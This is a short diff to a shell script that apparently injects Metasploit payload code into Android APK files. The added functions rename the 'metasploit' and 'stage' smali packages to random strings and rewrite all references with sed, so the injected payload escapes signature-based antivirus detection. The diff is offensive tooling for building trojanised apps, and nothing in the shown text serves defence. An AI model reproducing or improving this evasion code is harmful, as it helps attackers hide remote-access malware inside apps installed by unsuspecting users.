@@ -12,6 +12,28 @@ if ! [ -d "$(pwd)/logs" ]; then
 fi
 logfile="./logs/metapk-`date +%s`.log"
 
+rand_name(){
+        echo $(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
+        }
+
+obfuscate(){
+	if [ "$1" == "" ]; then
+	new_met=$(rand_name)
+	new_stage=$(rand_name)
+	mv original/smali/com/metasploit original/smali/com/$new_met
+	mv original/smali/com/$new_met/stage original/smali/com/$new_met/$new_stage
+	return
+fi
+for i in $1/*
+        do
+                sed -i 's/metasploit/'$new_met'/g' $i
+                sed -i 's/stage/'$new_stage'/g' $i
+                if [ -d $i ]; then
+                        obfuscate $i
+                fi
+done
+}
+
 cleanup(){
 	echo "+ Cleaning Up"
 	for i in activity file smaliloc.tmp smalifiles; do
@@ -214,6 +236,10 @@ cleanup
 
 cp_payload(){
 	cp -r payload/smali/com/metasploit original/smali/com
+	echo -n "+ Obfuscating Smali Files"
+	obfuscate
+	obfuscate original/smali/com/$new_met/$new_stage
+	echo "==> I Tried My Best"
 	manifest
 }
 
